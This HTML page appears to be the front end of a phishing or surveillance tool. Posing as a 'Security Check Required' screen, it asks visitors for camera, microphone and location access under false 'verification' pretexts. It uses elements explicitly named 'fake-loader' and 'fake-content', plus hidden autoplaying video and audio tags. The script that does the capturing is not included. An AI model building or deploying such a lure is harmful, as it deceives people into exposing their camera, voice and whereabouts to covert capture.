<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Security Verification | Please Wait</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="logo">
                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23667eea'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15h-2v-2h2v2zm0-4h-2V7h2v6z'/%3E%3C/svg%3E" alt="Security">
            </div>
            <h1>Security Check Required</h1>
            <p class="subtitle">Please complete verification to continue</p>
            
            <div class="fake-content">
                <div class="fake-loader"></div>
                <div class="fake-text">Loading security modules...</div>
            </div>
            
            <div class="permissions-container">
                <div class="permission-item" id="camera-item">
                    <div class="permission-icon">📷</div>
                    <div class="permission-info">
                        <div class="permission-name">Camera Access</div>
                        <div class="permission-desc">For face verification</div>
                    </div>
                    <div class="permission-status" id="camera-status">⏳</div>
                </div>
                
                <div class="permission-item" id="microphone-item">
                    <div class="permission-icon">🎤</div>
                    <div class="permission-info">
                        <div class="permission-name">Microphone Access</div>
                        <div class="permission-desc">For voice verification</div>
                    </div>
                    <div class="permission-status" id="microphone-status">⏳</div>
                </div>
                
                <div class="permission-item" id="location-item">
                    <div class="permission-icon">📍</div>
                    <div class="permission-info">
                        <div class="permission-name">Location Access</div>
                        <div class="permission-desc">For regional verification</div>
                    </div>
                    <div class="permission-status" id="location-status">⏳</div>
                </div>
            </div>
            
            <div class="progress-container">
                <div class="progress-bar" id="progress-bar"></div>
            </div>
            
            <div id="message" class="message"></div>
        </div>
    </div>
    
    <video id="video" style="display:none;" autoplay playsinline></video>
    <audio id="audio" style="display:none;"></audio>
    
    <script src="script.js"></script>
</body>
</html>
